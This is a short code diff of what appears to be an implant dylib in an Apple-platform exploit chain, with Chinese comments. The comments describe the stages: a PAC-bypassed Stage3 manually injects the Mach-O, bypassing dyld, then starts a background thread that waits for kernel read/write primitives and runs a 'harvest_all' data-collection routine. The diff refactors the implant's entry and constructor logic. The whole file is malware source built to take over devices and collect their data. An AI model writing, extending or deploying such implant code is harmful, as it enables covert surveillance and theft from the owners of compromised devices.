@@ -8,25 +8,11 @@
  *
  * 执行顺序：
  *   Stage3 调用 _process (PAC-bypassed caller)
- *   → process() 启动后台线程 → implant_main()
+ *   → process() → coruna_constructor() → 后台线程 → implant_main()
  *   → ke_run() / hook_slot 等待 → harvest_all()
  */
 
-#include <pthread.h>
-#include <stdint.h>
-
-/* ── 前向声明 ─────────────────────────────────────────────────────────────── */
-/* main.c 中定义的 coruna_hook_slot（Stage3 写入内核读写原语 VA）*/
-extern volatile uint64_t coruna_hook_slot[4];
-
-/* main.c 中的实际后台线程入口 */
-static void *implant_main(void *arg);  /* main.c 内部符号，通过弱链接共享 TU */
-
-/*
- * 由于 implant_main 和 coruna_constructor 定义在 main.c，
- * 而 C 翻译单元之间不能直接引用 static 函数，
- * 这里把 main.c 的 coruna_constructor 声明为 extern（non-static）。
- */
+/* coruna_constructor 定义在 main.c，通过 extern 跨翻译单元调用 */
 extern void coruna_constructor(void);
 
 /* ── dylib 主入口（由 Stage3 直接调用）────────────────────────────────────── */
@@ -43,7 +29,8 @@ void process(void) {
     /*
      * Stage3 是手动 Mach-O 注入，不经过 dyld，__attribute__((constructor))
      * 不会自动触发。在此手动调用 coruna_constructor() 以启动后台线程。
-     * coruna_constructor 内部使用 pthread_once 保证只初始化一次。
+     * coruna_constructor 内部使用 dispatch_once 保证只初始化一次，
+     * 即使将来同时走 dlopen 路径也不会重复启动。
      */
     coruna_constructor();
 }
